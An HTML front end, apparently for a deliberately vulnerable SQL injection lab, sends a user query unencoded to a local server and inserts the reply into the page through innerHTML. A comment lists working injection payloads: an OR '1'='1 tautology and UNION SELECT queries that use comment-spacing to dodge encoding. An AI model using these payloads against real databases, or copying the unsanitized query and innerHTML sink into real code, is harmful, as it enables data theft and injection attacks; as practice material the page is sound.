<!DOCTYPE html>
<head></head>
<body>
<h1> Welcome<br>Please enter a username to get started.</h1>
<input id = "QueryStr" type="text" placeholder="Insert Query">
<button id="submitQuery" type="button" placeholder="Submit">Submit</button>
<p id='QueryData'></p>
<!-- 
The slight nuance here is getting around the URL encoding, as since the node is such a barebones server that doesn't expect queries to contain unusual chars, it doesn't bother to decode them and instead just throws a 400 error with the returned data from the DB connection.

Some payloads:
'OR'1'='1
'/**/UNION/**/SELECT*FROM/**/users/**/WHERE/**/id>'
Use of functions in the query:
'/**/UNION/**/SELECT'*','*',CURRENT_ROLE()FROM/**/users/**/WHERE/**/id>'
-->
<script>
	var button = document.getElementById("submitQuery");
	var query;
	var para;
	var response;
	var response_data;
	async function embedResults()
	{
		console.log("got into event");
		query = document.getElementById("QueryStr").value;
		try 
		{
			para = document.getElementById("QueryData"); 
			var url = `http://127.0.0.1:8000/?query=${query}`;
			response = await fetch(url)
			.then(response => response.text())
			.then(data => embed(data, para))
			.catch(error => console.log(error));
			//response_data = await response.json();

		}
		catch (error)
		{
			console.error(error.message);
		}
	}
	function embed(data, sink)
	{
		sink.innerHTML = data;
	}
	button.addEventListener("click", embedResults); 
</script>
</body>
